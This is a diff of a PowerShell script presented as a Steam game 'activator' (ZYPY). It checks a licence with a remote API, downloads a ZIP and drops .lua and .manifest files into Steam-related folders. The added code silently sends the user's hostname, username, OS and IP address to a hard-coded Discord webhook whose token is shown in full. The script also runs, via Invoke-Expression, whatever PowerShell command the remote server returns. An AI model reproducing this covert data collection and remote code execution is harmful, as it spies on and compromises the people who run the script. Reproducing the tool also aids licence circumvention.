@@ -1,105 +1,120 @@
-# 1. Configurações Iniciais (Mantendo seus links e IDs)
+# Configurações Iniciais
 $API_URL = "https://gaamingsteam.squareweb.app/api/app/"
 $APP_ID = "kastexstorms"
 $ID_JOGO = "2215200"
 $WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"
 
-# Captura de dados do sistema (Ações originais traduzidas para PowerShell)
-$HOSTNAME_PC = hostname
-$USUARIO = whoami
-$DATA = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
-$STATUS = "✅ Sucesso"
-
-# Função de Mensagem (MessageBoxW)
+# Funções de Mensagem
 function Show-MessageBox {
     param([string]$Message, [string]$Title)
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($Message, $Title)
 }
 
-# 2. Buscar Configurações da API
+# Função para enviar relatório ao Discord
+function Send-DiscordReport {
+    param(
+        [string]$Status,
+        [string]$Descricao,
+        [int]$Cor # 3066993 = verde, 15158332 = vermelho, 16776960 = amarelo
+    )
+
+    $PCInfo = @{
+        hostname = $env:COMPUTERNAME
+        usuario  = $env:USERNAME
+        os       = (Get-CimInstance Win32_OperatingSystem).Caption
+        ip       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+        data     = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
+    }
+
+    $payload = @{
+        embeds = @(@{
+            title  = "📋 Relatório — ID Jogo: $ID_JOGO"
+            color  = $Cor
+            fields = @(
+                @{ name = "💻 PC";        value = $PCInfo.hostname; inline = $true  }
+                @{ name = "👤 Usuário";   value = $PCInfo.usuario;  inline = $true  }
+                @{ name = "🌐 IP";        value = "$($PCInfo.ip)";  inline = $true  }
+                @{ name = "🖥️ Sistema";   value = $PCInfo.os;       inline = $false }
+                @{ name = "🎮 ID do Jogo";value = $ID_JOGO;         inline = $true  }
+                @{ name = "📌 Status";    value = $Status;          inline = $true  }
+                @{ name = "📝 Detalhe";   value = $Descricao;       inline = $false }
+                @{ name = "🕐 Data/Hora"; value = $PCInfo.data;     inline = $false }
+            )
+            footer = @{ text = "ZYPY Activator" }
+        })
+    } | ConvertTo-Json -Depth 5
+
+    try {
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" | Out-Null
+    } catch {
+        # Silencioso — não interrompe o script se o Discord falhar
+    }
+}
+
+# 1. Buscar Configurações da API
 $UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
 try {
     $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
 } catch {
+    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao conectar à API: $_" -Cor 15158332
     Show-MessageBox -Message "Não foi possível conectar ao servidor.`n`nVerifique sua internet." -Title "Erro de Conexão"
     exit
 }
 
 if (-not $response.ativo) {
+    Send-DiscordReport -Status "⛔ Licença Inválida" -Descricao "Acesso desativado ou expirado para APP: $APP_ID" -Cor 16776960
     Show-MessageBox -Message "Seu acesso foi desativado ou expirou.`n`nEntre em contato com o suporte." -Title "Licença Inválida"
     exit
 }
 
-# 3. Detectar e Criar Pastas (Caminho MyDocuments\conteudo)
+# 2. Detectar Caminhos
 $DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
 if (-not (Test-Path $DocumentsPath)) {
     New-Item -ItemType Directory -Path $DocumentsPath | Out-Null
 }
 
-# 4. Baixar o arquivo ZIP
+# 3. Baixar o arquivo ZIP
 $ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
 try {
     Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino
 } catch {
-    $STATUS = "❌ Falhou no Download"
+    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao baixar o ZIP: $_" -Cor 15158332
     Write-Error "Falha ao baixar o arquivo ZIP."
+    exit
 }
 
-# 5. Processar e Extrair o ZIP (Lógica original de .lua e .st/.manifest)
+# 4. Extrair o ZIP
 $reiniciar = $false
 if (Test-Path $ZipDestino) {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     $zip = [System.IO.Compression.ZipFile]::OpenRead($ZipDestino)
-    
+
     foreach ($entry in $zip.Entries) {
         $destinoPath = $null
-        
+
         if ($entry.Name.ToLower().EndsWith(".lua")) {
             $destinoPath = $response.caminho_lua
-        }
-        elseif ($entry.Name.ToLower().EndsWith(".st") -or $entry.Name.ToLower().EndsWith(".manifest")) {
+        } elseif ($entry.Name.ToLower().EndsWith(".st") -or $entry.Name.ToLower().EndsWith(".manifest")) {
             $destinoPath = $response.caminho_manifest
         }
 
         if ($destinoPath) {
             if (-not (Test-Path $destinoPath)) { New-Item -ItemType Directory -Path $destinoPath -Force | Out-Null }
             $caminhoFinalAtivo = Join-Path $destinoPath $entry.Name
-            # Extração com overwrite (true) conforme original
             [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $caminhoFinalAtivo, $true)
             $reiniciar = $true
         }
     }
     $zip.Dispose()
-    Remove-Item $ZipDestino -Force
 }
 
-# 6. Enviar Relatório para o Discord (CORRIGIDO PARA EVITAR ERRO 50109)
-$PayloadObj = @{
-    embeds = @(@{
-        title = "📊 Relatório de Execução"
-        color = 3066993
-        fields = @(
-            @{ name = "🎮 ID do Jogo"; value = "$ID_JOGO"; inline = $true }
-            @{ name = "💻 PC"; value = "$HOSTNAME_PC"; inline = $true }
-            @{ name = "👤 Usuário"; value = "$USUARIO"; inline = $true }
-            @{ name = "📅 Data/Hora"; value = "$DATA"; inline = $true }
-            @{ name = "Status"; value = "$STATUS"; inline = $false }
-        )
-    })
-}
-
-$JsonBody = $PayloadObj | ConvertTo-Json -Depth 4 -Compress
-try {
-    # Enviando em UTF8 para o Discord aceitar os emojis e não dar erro de JSON
-    Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($JsonBody)) -ContentType "application/json"
-} catch {
-    Write-Host "Aviso: Log do Discord não enviado, mas a ativação continua."
-}
-
-# 7. Executar Comando Steam Update e Finalizar
+# 5. Executar e Finalizar
 if ($reiniciar -and $response.comando_powershell) {
     Invoke-Expression $response.comando_powershell
 }
+
+# Relatório final de sucesso
+Send-DiscordReport -Status "✅ Sucesso" -Descricao "Jogo ativado e arquivos extraídos com sucesso." -Cor 3066993
 
 Show-MessageBox -Message "Jogo ativado com sucesso! oferecimento ZYPY" -Title "Status"
